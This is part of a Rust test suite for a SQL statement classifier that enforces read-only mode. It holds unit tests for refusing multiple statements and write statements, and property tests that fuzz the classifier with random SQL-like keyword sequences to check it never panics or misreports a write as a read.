        let error = classify("SELECT 1; SELECT 2").unwrap_err();
        assert_eq!(error.id(), ErrorId::StatementMultiple);
        assert!(error.to_string().contains('2'));
    }

    #[test]
    fn the_refusal_names_the_mode_and_the_rule() {
        let error = classify("DELETE FROM orders WHERE id = 1")
            .and_then(|classification| check(&classification, Mode::ReadOnly, &SCOPE))
            .unwrap_err();
        assert_eq!(error.id(), ErrorId::StatementRefused);
        let text = error.to_string();
        assert!(text.contains("read-only"), "{text}");
        assert!(text.contains("write statement"), "{text}");
        assert!(error.remedy().contains("mode"));
    }
}

#[cfg(test)]
mod properties {
    use proptest::prelude::*;

    use super::*;

    fn sql_like() -> impl Strategy<Value = String> {
        let word = prop::sample::select(vec![
            "SELECT",
            "INSERT",
            "UPDATE",
            "DELETE",
            "FROM",
            "WHERE",
            "INTO",
            "VALUES",
            "SET",
            "DROP",
            "TABLE",
            "CREATE",
            "WITH",
            "AS",
            "JOIN",
            "ON",
            "AND",
            "OR",
            "NOT",
            "NULL",
            "app.orders",
            "orders",
            "id",
            "1",
            "'text'",
            "(",
            ")",
            ",",
            "*",
            ";",
            "--",
            "/*",
            "*/",
            "$1",
            "::int",
            "pg_catalog.pg_class",
            "COPY",
            "TO",
            "PROGRAM",
            "STDIN",
        ]);
        prop::collection::vec(word, 0..24).prop_map(|words| words.join(" "))
    }

    proptest! {
        #![proptest_config(ProptestConfig::with_cases(512))]

        #[test]
        fn any_text_classifies_or_is_refused_without_a_panic(sql in "\\PC{0,200}") {
            let _ = classify(&sql);
        }

        #[test]
        fn sql_shaped_text_never_reports_a_read_that_writes(sql in sql_like()) {
            if let Ok(classification) = classify(&sql) {
                let kind = classification.kind.as_str();
                if classification.class == StatementClass::Read {
                    prop_assert!(
                        !matches!(kind, "InsertStmt" | "UpdateStmt" | "DeleteStmt" | "CopyStmt" | "DropStmt" | "TruncateStmt"),
                        "{kind} classified as a read: {sql}"
                    );
                }
                prop_assert_eq!(classification.sql_sha256.len(), 64);
            }
        }
    }
}
